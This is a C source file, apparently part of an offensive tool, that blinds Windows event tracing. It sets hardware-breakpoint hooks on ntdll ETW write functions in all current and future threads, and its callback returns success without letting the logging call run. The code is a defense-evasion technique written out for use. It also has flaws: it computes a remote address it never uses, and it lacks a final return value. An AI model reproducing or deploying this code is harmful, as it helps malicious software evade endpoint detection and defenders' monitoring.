#include "etw_bypass.h"


VOID EtwCallback(PCONTEXT Ctx) {
    // Set RAX to 0 to indicate success
 	SET_RETURN_VALUE(Ctx, (ULONG)0);

    // Block the original function call
	BLOCK_REAL(Ctx);

    // Continue execution without calling the original function
    DebugPrint("[i] EtwDetour called, returning SUCCESS and blocking original function call.\n");
	CONTINUE_EXECUTION(Ctx);
}

BOOL HbpEtwHooking(HANDLE hProcess, LPSTR functionName){
    PBYTE       pLocalFuncAddr  = NULL,
                pRemoteFuncAddr = NULL;

    if (strcmp(functionName, "EtwpEventWriteFull") == 0) {
        pLocalFuncAddr = (PBYTE)fetchEtwpEventWriteFullAddr(hProcess);
        if (!pLocalFuncAddr) {
			DebugPrint("[!] Failed to fetch EtwpEventWriteFull address.\n");
            return FALSE;
        }
        pRemoteFuncAddr = pLocalFuncAddr;
        DebugPrint("[+] EtwpEventWriteFull : 0x%p \n", pLocalFuncAddr);
    } else {
        // 1. Get local module base address for ntdll.dll
        HMODULE hLocalNtdll = GetModuleHandleA("ntdll");
        if (!hLocalNtdll) {
            DebugPrint("[!] Failed to get local ntdll handle\n");
            return FALSE;
        }

        // 2. Get local function address
        pLocalFuncAddr = (PBYTE)GetProcAddress(hLocalNtdll, functionName);
        if (!pLocalFuncAddr) {
            DebugPrint("[!] Failed to get local function address\n");
            return FALSE;
        }

        DebugPrint("[+] %s : 0x%p \n", functionName, pLocalFuncAddr);

        // 3. Get remote ntdll base address
        HMODULE hRemoteNtdll = NULL;

        // Use Toolhelp snapshot to find remote ntdll.dll base
        MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
        HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
        if (hModuleSnap == INVALID_HANDLE_VALUE) {
            DebugPrint("[!] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
            return FALSE;
        }
        BOOL found = FALSE;
        if (Module32First(hModuleSnap, &me32)) {
            do {
                if (_stricmp(me32.szModule, "ntdll.dll") == 0) {
                    hRemoteNtdll = (HMODULE)me32.modBaseAddr;
                    found = TRUE;
                    break;
                }
            } while (Module32Next(hModuleSnap, &me32));
        }
        CloseHandle(hModuleSnap);

        if (!found) {
            DebugPrint("[!] Failed to find ntdll.dll in remote process\n");
            return FALSE;
        }

        // 4. Calculate function offset from local ntdll base
        ptrdiff_t offset = pLocalFuncAddr - (PBYTE)hLocalNtdll;

        // 5. Calculate remote function address
        pRemoteFuncAddr = (PBYTE)hRemoteNtdll + offset;
    }

    if (!InitHardwareBreakpointHooking())
		return FALSE;

	// Hook 'pEtwpEventWriteFull' to call 'EtwpEventWriteFullDetour' instead - using the Dr0 register
	DebugPrint("[i] Installing Hooks ...\n");
	if (!InstallHardwareBreakingPntHook((PUINT_VAR_T)pLocalFuncAddr, Dr0, EtwCallback, ALL_THREADS))
		return FALSE;

	// Install the same 'ALL_THREADS' hooks on new threads created in the future - using the Dr1 register
	DebugPrint("[i] Installing The Same Hooks On New Threads ...\n");
	if (!InstallHooksOnNewThreads(Dr1))
		return FALSE;

    DebugPrint("[+] Hardware Breakpoint ETW Hooks installed successfully!\n");
}